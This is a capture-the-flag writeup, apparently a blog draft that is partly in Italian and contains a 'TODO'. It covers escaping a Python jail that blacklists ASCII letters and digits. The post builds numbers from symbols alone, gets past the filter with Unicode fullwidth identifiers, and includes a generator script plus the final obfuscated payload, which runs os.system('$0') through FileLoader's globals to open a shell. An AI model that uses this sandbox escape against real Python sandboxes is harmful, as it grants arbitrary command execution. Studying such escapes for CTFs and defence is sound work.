---
setup: |
  import Layout from '../../layouts/BlogPost.astro'
  import PictureThemed from '../../components/PictureThemed.astro'
title: pyjail escape without ascii characters and numbers - bluehens writeup
publishDate: 2023-11-1
description: writeup for the challenge calc - PingCTF 2023
tags: ['writeup', 'python', 'pyjail']
permalink: https://halb.it/posts/bluehens-pyjail/
---

### the challenge

The challenge code consisted in a very short python script, running behind netcat

```python
blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

security_check = lambda s: any(c in blacklist for c in s) or s.count('_') > 50

while True: 
    cmds = input("> ")
    if security_check(cmds):
        print("nope.")
    else:
        exec(cmds, {'__builtins__': None}, {})
    
```

For the uninitialized, this is a very common pyjail setup:

- The `security_check` function makes sure the user input does not contain any ascii letter or number

- if the input is valid, it is executed in an environment without any builtin

- By looking at the challenge Dockerfile, it's clear that our goal is to read the `/flag` file and print it

### python without letters or numbers

The Javascript language can be written using only combinations of the symbols `[]()!+` in a dialect known as [jsfuck](https://jsfuck.com).
Unfortunately python does not reach these levels of greatness, but it can get close.

These are the basic building blocks that python3 offers, thanks to its inplicit type conversion:

- `False`  => `[] > []`
- `True`   => `[[]] > []`
- `0` => `-([] > [])`
- `-1` => `~([] > [])`
- `1` => `-~([] > [])`
- `2` => `1+1` =>  `(-~[]<[])+(-~([]<[])) `

With some creativity, it's easy to create any number. There is the possibility for a lot of fancy optimizations if you are allowed to use `*, <<, >>` or other operators. The current challenge however does not have a payload size constraint, so we'll keep everything as simple as possible

```python
def craft_num(n):
    """
    craft symbol-only numbers, in an inefficient way
    """
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = f"{str_1}+" * n
    return ret[:-1]
```

Unfortunately this is where we meet a wall, because python3 does not offer any way to create strings or execute statements with symbols only.
That was only possible in the age of python2 thanks to the 
&#96;
backtick operator, now removed from the standard, that acted as an alias for the `repr()` function.

### filter bypass using utf-8 identifiers

If python3 broke the dream of a symbols-only python dialect, it also brought 
UTF-8 identifiers to the standard.
In our case, that feature is good enough to bypass the no-ASCII filter.<br/>
According to [the reference](https://docs.python.org/3/reference/lexical_analysis.html#identifiers):

> Python 3.0 introduces additional characters from outside the ASCII rannge. [...]
All identifiers are converted into the normal form NFKC while parsing; comparison of identifiers is based on NFKC.

what does that mean?
The Unicode standard supports the concept of [equivalence](https://www.wikiwand.com/en/Unicode_equivalence#/Normal_forms).
If we look at this useful page for the [codepoint for the letter a](https://www.compart.com/en/unicode/U+0061) for example,
we can see a long list of symbols that are declaratively similar in appearance or meaning to the ASCII letter 'a'.<br/> Here are some examples:

- U+1D4B6 𝒶 Mathematical Script Small A
- U+1D4EA 𝓪 Mathematical Bold Script Small A
- U+1D552 𝕒 Mathematical Double-Struck Small A
- U+1D586 𝖆 Mathematical Bold Fraktur Small A

All these fancy codepoints will be converted into the correct ASCII letter when [normalized](https://unicode.org/reports/tr15/#Norm_Forms), which is an operation that python3 performs before parsing an identifier. <br/>
A lot of words just to say that we can bypass the filter by converting all the ASCII letters in our exploit into italics!

The following function converts every ASCII letter into the equivalent
[ｆｕｌｌｗｉｄｔｈ ｌｅｔｔｅｒｓ](https://www.compart.com/en/unicode/U+FF41)

```python
def denormalize(str):
    ret = ""
    for c in str:
        if c >= "a" and c <= "z":
            # https://www.compart.com/en/unicode/U+FF41
            # weird fullwidth a
            # the first of a sequence of codepoints compatible with ASCII letters
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        elif c == "_":
            # https://www.compart.com/en/unicode/U+FF3F
            # fullwidth underscore
            ret += chr(0xff3f)
        else:
            ret += c
    return ret

 denormalize("__class__.__base__.__doc__")
'__ｃｌａｓｓ__.__ｂａｓｅ__.__ｄｏｃ__'
```

### escaping the pyjail

Now that we have the ability to fully bypass the filter, we can focus on escaping the pyjail.
Remember that our goal is to write something like this:
```python
print(open("/flag").read())
```

or this:

```python
import os; os.system('/bin/sh')
```

Unfortunately the code is being executed in an environment without [builtins](https://docs.python.org/3/library/functions.html), which means that not only we
don't have access to any useful function such as `print` or `open`, but we don't even have access to the `import` statement since the import functionality is handled by the `__import__()` builtin function

TODO

https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html
---


Il nostro exploit sarebbe questo:
```
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'FileLoader'][0].__init__.__globals__['_os'].system('/bin/sh') 

```
tuttavia non possiamo usare la stringa 'FileLoader', quindi ci troviamo a mano
il suo index: 118

questo ci porta al prossimo problema:

```
['_os']
```
come creiamo una stringa? ci serve
    "_os", "/bin/sh"

quindi ci servono i char:

    "_" "o" "s" , "/", "b", "i", "n" "h"


ancora meglio:
ci sono modi piu veloci di lanciare una shell:

https://www.commandlinefu.com/commands/view/11704/launch-bash-without-using-any-letters

```
$0
```

quindi ci serve solo

    "_" "o" "s" "0"

underscore: basta fare cosi
expl_get_underscore = f"().__init__.__name__[0]"

il resto delle lettere le possiamo prendere dalle doc delle varie primitive, seguono alcuni esempi:

expl_test = f"().__class__.__doc__"


```python
blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
security_check = lambda s: any(c in blacklist for c in s) or s.count('_') > 50


def NFCK_denormalize(str):
    ret = ""
    previous_char_was_dot = False
    for c in str:
        if c == "_" and not previous_char_was_dot:
            #ret += c
            ret += chr(0xff3f)
        elif c == ":":
            ret += "_"
        elif c >= "a" and c <= "z":
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        else:
            ret += c
        #handle dot
        previous_char_was_dot = c == "."
    return ret


def decompose_bits(number):
    powers = []
    power = 0
    while number > 0:
        if number & 1:
            powers.append(power)
        power += 1
        number >>= 1
    return powers


def craft_num(n):
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = ""
    for i in decompose_bits(n):
        ret += f"({str_1}<<{craft_num(i)})+"
    return ret[:-1]


def craft_num_inefficient(n):
    """
    a simplier to understand, but more inefficient way to
    craft sybol-only numbers
    """
    if n == 0:
        return "-([]<[])"
    ret ="(-~([]<[]))+"*n
    ret = ret[:-1]
    return ret


def craft_os_str():
    """
    returns the string "_os"
    """
    underscore_str = f"().__init__.__name__[{craft_num(0)}]"
    s_str = f"[].__doc__[{craft_num(17)}]"
    br = "{}"
    o_str = f"{br}.__class__.__base__.__doc__[{craft_num(15)}]"
    os_str = f"({underscore_str})+({o_str})+({s_str})"
    return os_str


def craft_bash_str():
    """
    returns the string "$0"
    which in the challenge environment is equivalent to
    the command /bin/sh
    """
    num_0_str = f"({craft_num(0)}).__doc__[{craft_num(33)}]"
    bash_str = f"'$'+({num_0_str})"
    return bash_str


# the dump was exported to a txt, and the offset of FileLoader was found manually,
# with the power of vim
expl_dump_all_classes = f"print(().__class__.__base__.__subclasses__())"

# This works! it returns <class FileLoader>
expl_find_FileLoader = f"print(().__class__.__base__.__subclasses__()[{craft_num(118)}])"

#This works" it spawns a shell"
expl_shell = f"().__class__.__base__.__subclasses__()[{craft_num(118)}].__init__.__globals__[{craft_os_str()}].system({craft_bash_str()})"

# choose your exploit here
expl = expl_shell

expl = NFCK_denormalize(expl)
if security_check(expl):
    print("nope.")
else:
    print(expl)
    #exec(expl)

```


```
()._＿ｃｌａｓｓ＿＿._＿ｂａｓｅ＿＿._＿ｓｕｂｃｌａｓｓｅｓ＿＿()[((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))]._＿ｉｎｉｔ＿＿._＿ｇｌｏｂａｌｓ＿＿[(()._＿ｉｎｉｔ＿＿._＿ｎａｍｅ＿＿[-([]<[])])+({}._＿ｃｌａｓｓ＿＿._＿ｂａｓｅ＿＿._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))])+([]._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))])].ｓｙｓｔｅｍ('$'+((-([]<[]))._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))]))
```
